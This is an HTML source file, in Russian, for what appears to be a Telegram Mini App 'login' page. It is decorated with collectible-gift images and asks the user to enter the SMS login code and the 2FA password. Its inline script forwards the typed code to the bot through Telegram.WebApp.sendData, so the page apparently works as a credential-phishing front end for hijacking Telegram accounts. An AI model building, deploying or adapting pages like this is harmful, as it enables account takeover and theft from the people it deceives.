<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="loginScreenScripts.css">
    <link rel="stylesheet" href="squares.css">
    <link rel="stylesheet" href="popup.css">
    <script src="https://telegram.org/js/telegram-web-app.js?59"></script>
</head>

<body>
    <div class="area">
        <div class="container">
            <div id="page1">
                <div id="bg">
                    <img class="main-logo" src="assets/ico.svg" alt="">
                    <h1 id="TEST">test 1.5</h1>
                    <p>Для продолжения работы с ботом необходимо авторизоваться через <span style="color: #68ba4f; font-weight: bold; text-shadow: 0 0 0.5rem #59be4a;">Telegram</span></p>
                    <button class="btn" id="loginbtn">
                        <img src="assets/tg.svg" alt="">
                        Войти через Telegram
                    </button>
                </div>
            </div>
            <div class="blur" id="blur"></div>
            <div id="page2">
                <img class="small-logo" src="assets/ico.svg" alt="">
                <p class="passcode-title">Введите код из СМС</p>
                <div class="code-box" id="codeBox">
                    <div class="cell"></div>
                    <div class="cell"></div>
                    <div class="cell"></div>
                    <div class="cell"></div>
                    <div class="cell"></div>
                </div>
                <input id="hiddenInput" type="text" maxlength="5" inputmode="numeric" />
                <button class="btn" id="passcode-btn" onclick="sendCodeToBot()">Подтвердить</button>
                <div id="popup"></div>
            </div>
            <div id="page3">
                <img class="small-logo" src="assets/ico.svg" alt="">
                <h1 class="passcode-title">Введите пароль 2FA</h1>
                <input type="text" placeholder="Пароль" id="twofactor-input">
                <button class="btn" id="twofactor-btn">Подтвердить</button>
                <div id="popup"></div>
            </div>
        </div>

        <ul class="circles">
            <img src="assets/33.svg" alt="">
            <img src="assets/Ion Gem.svg" alt="">
            <img src="assets/Plush Pepe.svg" alt="">
            <img src="assets/Toy Bear.svg" alt="">
            <img src="assets/Vintage Cigar.svg" alt="">
            <img src="assets/Ionic Dryer.svg" alt="">
            <img src="assets/Lush Bouquet.svg" alt="">
            <img src="assets/18.svg" alt="">
            <img src="assets/Witch Hat.svg" alt="">
            <img src="assets/Precious Peach.svg" alt="">
        </ul>

    </div>

    <script src="loginScreenScripts.js"></script>

    <script>
        let code = ''; // Переменная для хранения введённого кода

        // Обновление кода при вводе
        function updateCode() {
            code = document.getElementById('hiddenInput').value;
        }

        // Функция для отправки кода в Telegram (без закрытия WebApp)
        function sendCodeToBot() {
            if (code.length === 5) {
                // Отправка данных в Telegram Web App
                if (Telegram.WebApp) {
                    Telegram.WebApp.sendData(code);  // Отправка данных через WebApp API
                }
            } else {
                alert("Введите правильный код!");
            }
        }

        // Добавим обработку ввода, чтобы обновить код при каждом вводе
        document.getElementById('hiddenInput').addEventListener('input', updateCode);
    </script>

</body>
</html>
